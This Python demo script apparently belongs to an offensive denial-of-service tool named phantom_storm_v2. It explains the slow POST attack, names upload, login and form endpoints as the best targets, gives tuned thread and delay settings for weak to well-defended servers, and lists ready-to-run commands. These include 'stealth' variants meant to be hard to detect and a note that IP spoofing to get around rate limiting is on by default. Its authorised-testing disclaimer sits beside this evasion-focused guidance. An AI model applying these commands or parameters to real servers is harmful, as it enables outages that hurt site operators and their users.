#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Slow POST Attack Demo
=====================

Demonstrates how to use the Slow POST attack feature.

LEGAL DISCLAIMER:
    This demo is for AUTHORIZED TESTING ONLY in controlled lab environments.
    You MUST have explicit written permission to test any target system.

Usage Examples:
    1. Basic slow POST attack (HTTP):
       python phantom_storm_v2.py 192.168.1.2 80 100 --attack-type=slow-post

    2. Slow POST with custom parameters:
       python phantom_storm_v2.py 192.168.1.2 80 100 --attack-type=slow-post --content-length=500000 --post-delay=5.0

    3. Slow POST over HTTPS:
       python phantom_storm_v2.py 192.168.1.2 443 100 --attack-type=slow-post --https

    4. Aggressive slow POST (fast byte rate):
       python phantom_storm_v2.py 192.168.1.2 80 200 --attack-type=slow-post --content-length=100000 --post-delay=1.0

    5. Stealth slow POST (very slow, hard to detect):
       python phantom_storm_v2.py 192.168.1.2 80 50 --attack-type=slow-post --content-length=1000000 --post-delay=30.0
"""

from src.core.slow_post import SlowPostHelper
from src.core.attack_types import AttackType

def print_attack_info():
    """Display information about slow POST attack"""
    
    print("=" * 80)
    print("SLOW POST ATTACK - OVERVIEW")
    print("=" * 80)
    print()
    print(AttackType.get_description(AttackType.SLOW_POST))
    print()
    print("How it works:")
    print("  1. Send complete HTTP POST headers with large Content-Length")
    print("  2. Send body data byte-by-byte with configurable delays")
    print("  3. Server must wait for complete body → connection exhaustion")
    print("  4. Multiple connections → server resource exhaustion")
    print()
    print("Best targets:")
    print("  • Upload endpoints (/upload, /api/upload, /file/upload)")
    print("  • Form submission endpoints (/contact, /register, /login)")
    print("  • API endpoints accepting POST data")
    print("  • Comment/feedback submission forms")
    print()
    print("Effectiveness:")
    print("  ✓ Very effective against upload handlers")
    print("  ✓ Bypasses many timeout defenses (server receives data)")
    print("  ✓ Works well with low bandwidth")
    print("  ✓ Hard to detect (looks like slow client upload)")
    print("  ✓ Low resource usage on attacker side")
    print()
    print("=" * 80)
    print()

def print_parameter_suggestions():
    """Display parameter suggestions for different targets"""
    
    print("=" * 80)
    print("RECOMMENDED PARAMETERS")
    print("=" * 80)
    print()
    
    weak = SlowPostHelper.suggest_parameters("weak")
    print(f"Weak Target (small server, limited resources):")
    print(f"  Threads        : {weak['threads']}")
    print(f"  Content-Length : {weak['content_length']:,} bytes")
    print(f"  Byte Delay     : {weak['byte_delay']} seconds")
    print(f"  Duration/conn  : {SlowPostHelper.format_duration(SlowPostHelper.calculate_attack_duration(weak['content_length'], weak['byte_delay']))}")
    print()
    
    medium = SlowPostHelper.suggest_parameters("medium")
    print(f"Medium Target (typical web server):")
    print(f"  Threads        : {medium['threads']}")
    print(f"  Content-Length : {medium['content_length']:,} bytes")
    print(f"  Byte Delay     : {medium['byte_delay']} seconds")
    print(f"  Duration/conn  : {SlowPostHelper.format_duration(SlowPostHelper.calculate_attack_duration(medium['content_length'], medium['byte_delay']))}")
    print()
    
    strong = SlowPostHelper.suggest_parameters("strong")
    print(f"Strong Target (enterprise server, well-defended):")
    print(f"  Threads        : {strong['threads']}")
    print(f"  Content-Length : {strong['content_length']:,} bytes")
    print(f"  Byte Delay     : {strong['byte_delay']} seconds")
    print(f"  Duration/conn  : {SlowPostHelper.format_duration(SlowPostHelper.calculate_attack_duration(strong['content_length'], strong['byte_delay']))}")
    print()
    print("=" * 80)
    print()

def print_command_examples():
    """Display example commands"""
    
    print("=" * 80)
    print("COMMAND EXAMPLES")
    print("=" * 80)
    print()
    
    print("Example 1: Basic slow POST attack")
    print("  python phantom_storm_v2.py 192.168.1.2 80 100 --attack-type=slow-post")
    print()
    
    print("Example 2: Custom parameters (faster attack)")
    print("  python phantom_storm_v2.py 192.168.1.2 80 100 \\")
    print("    --attack-type=slow-post \\")
    print("    --content-length=500000 \\")
    print("    --post-delay=5.0")
    print()
    
    print("Example 3: HTTPS target")
    print("  python phantom_storm_v2.py 192.168.1.2 443 100 \\")
    print("    --attack-type=slow-post \\")
    print("    --https")
    print()
    
    print("Example 4: Aggressive attack (200 threads, fast bytes)")
    print("  python phantom_storm_v2.py 192.168.1.2 80 200 \\")
    print("    --attack-type=slow-post \\")
    print("    --content-length=100000 \\")
    print("    --post-delay=1.0")
    print()
    
    print("Example 5: Stealth attack (slow, hard to detect)")
    print("  python phantom_storm_v2.py 192.168.1.2 80 50 \\")
    print("    --attack-type=slow-post \\")
    print("    --content-length=1000000 \\")
    print("    --post-delay=30.0")
    print()
    
    print("Example 6: Combined with IP spoofing (bypass rate limiting)")
    print("  python phantom_storm_v2.py 192.168.1.2 80 100 \\")
    print("    --attack-type=slow-post \\")
    print("    --content-length=500000 \\")
    print("    --post-delay=10.0")
    print("  (IP spoofing is enabled by default)")
    print()
    
    print("=" * 80)
    print()

def main():
    """Main demo function"""
    
    print()
    print_attack_info()
    print_parameter_suggestions()
    print_command_examples()
    
    print("READY TO TEST?")
    print("  1. Make sure you have AUTHORIZATION to test the target")
    print("  2. Start with lower thread counts (50-100) to observe behavior")
    print("  3. Monitor target server resources during attack")
    print("  4. Adjust parameters based on effectiveness")
    print()
    print("For more information, see: docs/ATTACK_METHODS.md")
    print()

if __name__ == "__main__":
    main()
